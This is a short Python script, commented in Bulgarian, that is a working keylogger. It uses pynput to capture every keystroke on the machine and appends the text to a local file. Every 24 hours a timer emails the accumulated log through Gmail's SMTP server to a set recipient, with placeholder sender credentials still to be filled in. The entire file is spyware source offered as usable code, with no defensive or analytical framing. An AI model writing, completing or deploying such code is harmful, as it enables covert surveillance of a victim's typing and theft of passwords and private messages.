from pynput import keyboard
import threading
import smtplib
from email.message import EmailMessage

text = ""
file_path = "keyboard_data.txt"  # Файлът, в който ще записвате клавишите
time_interval = 86400  # 24 часа в секунди

# Функция за записване на текст във файл
def save_to_file(data):
    with open(file_path, 'a') as file:
        file.write(data)

# Функция за записване на текст във файл и изпращане на имейл
def save_to_file_and_send_email():
    global text
    save_to_file(text)
    send_email(file_path)  # Изпращане на файла
    text = ""
    timer = threading.Timer(time_interval, save_to_file_and_send_email)
    timer.start()

# Функция за изпращане на имейл
def send_email(file):
    msg = EmailMessage()
    msg['From'] = 'your_email@gmail.com'
    msg['To'] = 'recipient_email@example.com'
    msg['Subject'] = 'Keyboard Data'

    with open(file, 'r') as f:
        content = f.read()

    msg.set_content(content)

    with smtplib.SMTP('smtp.gmail.com', 587) as smtp:
        smtp.starttls()
        smtp.login('your_email@gmail.com', 'your_password')
        smtp.send_message(msg)

# Функция, която реагира на натискане на клавиши
def on_press(key):
    global text
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        text += str(key).strip("'")

# Стартиране на слушателя за клавиатурата и изпълнение на функцията за записване и изпращане на имейл
with keyboard.Listener(on_press=on_press) as listener:
    save_to_file_and_send_email()
    listener.join()
